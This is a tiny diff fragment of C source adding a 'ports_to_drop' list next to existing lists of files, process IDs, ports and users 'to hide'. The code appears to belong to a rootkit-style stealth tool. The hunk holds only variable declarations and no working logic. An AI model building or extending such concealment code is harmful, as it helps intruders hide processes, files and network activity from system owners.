@@ -13,6 +13,7 @@ list *files_to_hide = NULL;
 list *pids_to_hide = NULL;
 list *ports_to_hide = NULL;
 list *users_to_hide = NULL;
+list *ports_to_drop = NULL;
 
 
 
